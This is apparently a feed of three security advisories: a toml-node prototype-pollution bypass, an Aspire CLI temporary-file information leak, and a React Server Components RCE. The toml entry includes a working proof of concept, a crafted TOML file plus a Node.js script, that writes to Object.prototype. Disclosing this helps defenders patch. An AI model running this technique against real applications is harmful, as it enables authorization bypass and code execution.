entry.title: [toml] toml-node: Prototype pollution: parsing a TOML document can write to Object.prototype
entry.content:
Summary

CVE-2026-63376 described prototype pollution through proto key-path desynchronization and was fixed in 4.1.2 by rewriting the path bookkeeping and adding an ownedContainers WeakSet. The desynchronization is still reachable, spelled with a quote character instead of a dot, and the owned-container check is not applied on the path that matters.

A four-line TOML document parsed with toml.parse() writes a property onto Object.prototype, where it is visible to every object in the process — including objects produced by unrelated libraries.

Details

Three gaps compose. All line numbers are lib/compiler.js in 5.0.0.

1. The path-key encoding is ambiguous. quoteDottedString() quotes a segment only when it contains a ., and never escapes a " inside the segment:

287:  function quoteDottedString(str) {
288:    if (str.indexOf(".") > -1) {
289:      return "\"" + str + "\"";
290:    } else {
291:      return str;
292:    }
293:  }

So the key path ['x.y'] and the key path ['"x', 'y"'] both render as the string "x.y". This is the same desynchronization CVE-2026-63376 named, with a quote in place of the dot.

2. A table-array header can clear another key's guard. addTableArray() walks assignedPaths / valueAssignments with isSameOrSubPath() over those ambiguous strings, so a header whose rendered path collides with an unrelated key deletes that key's entry.

3. The descent in assign() has no owned-container check. deepRef() applies isOwnedContainer() only to intermediate segments (lib/compiler.js:265, :273) and returns the final container unchecked. assign() then walks it with only a shape test:

 93:      target = target[k];
...
103:    target[lastKey] = reduced;

A TOML datetime is a Date. It satisfies typeof target[k] === "object" and is not an array, so the walk descends into it — and a Date has a live prototype chain to Object.prototype.

Putting the three together, a document can make the current table a Date and then walk __proto__.__proto__ to Object.prototype.

mkdir poc && cd poc && npm init -y >/dev/null && npm install toml@5.0.0

# poc.toml
"b.c" = 1979-05-27T07:32:00Z
[['"b']]
["b.c"]
__proto__.__proto__.polluted = "yes"

Line 1 defines a key whose rendered path is "b.c" and whose value is a Date. Line 2 is a table-array header whose rendered path collides with it, clearing its guard. Line 3 re-enters that key, so the current table is now the Date. Line 4 walks Date → Date.prototype → Object.prototype.

// poc.js
const toml = require('toml');
const fs = require('fs');

console.log('before:', JSON.stringify(({}).polluted));
toml.parse(fs.readFileSync('poc.toml', 'utf8'));
console.log('after: ', JSON.stringify(({}).polluted));
console.log('Object.prototype.hasOwnProperty("polluted") =', Object.prototype.hasOwnProperty('polluted'));
console.log('JSON.parse("{}").polluted =', JSON.stringify(JSON.parse('{}').polluted));

$ node poc.js
before: undefined
after:  "yes"
Object.prototype.hasOwnProperty("polluted") = true
JSON.parse("{}").polluted = "yes"

The payload sets a single harmless marker property. The last line shows the property is visible on an object this code never touched.

A useful control: the same document without line 2 (the guard-clearing header) is correctly rejected on 4.1.2 and later, which confirms the clearing step is what is load-bearing.

Impact

Any application that parses a TOML document from an untrusted source is affected — a configuration file uploaded by a user, a manifest from a third-party package or repository, a document posted to an API. Prototype pollution of this kind commonly escalates to authentication or authorization bypass, denial of service, and in applications with a suitable gadget, remote code execution, because every object in the process inherits the injected property.

Suggested fix: in assign(), apply the same check the intermediate descent already uses — after target = target[k], reject when !isOwnedContainer(target). Equivalently, apply isOwnedContainer to the value deepRef() returns. Separately, quoteDottedString() should escape " inside a segment so that distinct key paths cannot render to the same string.

entry.title: [@microsoft/aspire-cli-osx-arm64] Microsoft Security Advisory CVE-2026-120792 - Aspire Information Disclosure Vulnerability
entry.content:
Executive summary

Microsoft is releasing this security advisory to provide information about a vulnerability in the Aspire CLI. This advisory provides guidance on updating affected applications and components.

Insecure temporary files used by Aspire CLI can allow a local attacker to obtain sensitive configuration information.

Announcement

Announcement for this issue can be found at https://github.com/dotnet/announcements/issues/518

CVSS Details

  • Version: 3.1
  • Severity: High
  • Score: 7.3
  • Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:L
  • Weakness: CWE-532 (Insertion of Sensitive Information into Log File)
  • MSRC severity: Important
  • Impact: Information Disclosure

Affected Platforms

  • Platforms: Linux, macOS
  • Architectures: x64, Arm64

Affected Packages

Standalone Aspire CLI

Package Affected version Patched version
Aspire CLI (Aspire.Cli) >= 13.2.0, < 13.6.5 13.6.5
Aspire.Cli.linux-x64 >= 13.3.0, < 13.6.5 13.6.5
Aspire.Cli.linux-arm64 >= 13.3.0, < 13.6.5 13.6.5
Aspire.Cli.linux-musl-x64 >= 13.3.0, < 13.6.5 13.6.5
Aspire.Cli.osx-x64 >= 13.3.0, < 13.6.5 13.6.5
Aspire.Cli.osx-arm64 >= 13.3.0, < 13.6.5 13.6.5

Aspire CLI npm packages

Package Affected version Patched version
@microsoft/aspire-cli >= 13.4.2, < 13.6.5 13.6.5
@microsoft/aspire-cli-linux-x64 >= 13.4.2, < 13.6.5 13.6.5
@microsoft/aspire-cli-linux-arm64 >= 13.4.2, < 13.6.5 13.6.5
@microsoft/aspire-cli-linux-musl-x64 >= 13.4.2, < 13.6.5 13.6.5
@microsoft/aspire-cli-osx-x64 >= 13.4.2, < 13.6.5 13.6.5
@microsoft/aspire-cli-osx-arm64 >= 13.4.2, < 13.6.5 13.6.5

The affected component is the Aspire CLI's deprecated MCP configuration scanner, which ships in the CLI packages listed above. Its temporary-file diagnostics can include configuration content and use a fixed path in a shared temporary directory.

Advisory FAQ

How do I know if I am affected?

The reported scenario involves running Aspire CLI agent or MCP initialization commands on a non-Windows system with a temporary directory shared by multiple users. Versions 13.2.0 through 13.6.4 are affected.

Aspire ships independently of .NET. Installing a .NET runtime or SDK update does not establish that the affected Aspire CLI has been updated.

How do I fix the issue?

Update the Aspire CLI to version 13.6.5 or later. If installed as a .NET tool, update the Aspire.Cli package. If installed using npm, update @microsoft/aspire-cli to version 13.6.5 or later; its platform-specific dependency must also resolve to version 13.6.5 or later. Otherwise update the CLI through its installation method.

Security reports made through MSRC may qualify for the Microsoft .NET Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at https://aka.ms/corebounty.

entry.title: [react-server-dom-webpack] React: Unauthenticated Remote Code Execution in React Server Components
entry.content:
Impact

Crafted payloads targeting frameworks supporting React Server Components can lead to remote code execution. This only affects extremely rare cases where responses transport multiple typed arrays and an attacker-controlled value.

Updating immediately is recommended.

The vulnerability exists in versions 19.0.0 through 19.0.8, 19.1.0 through 19.1.9, 19.2.0 through 19.2.8 and 19.3.0 of:

  • react-server-dom-webpack
  • react-server-dom-parcel
  • react-server-dom-turbopack

Patches

Fixes were back ported to versions 19.0.09, 19.1.10, 19.2.9, and 19.3.1.

If applications are using any of the above packages please upgrade to any of the fixed versions immediately.

If an app’s React code does not use a server, the app is not affected by this vulnerability. If an app does not use a framework, bundler, or bundler plugin that supports React Server Components, the app is not affected by this vulnerability.
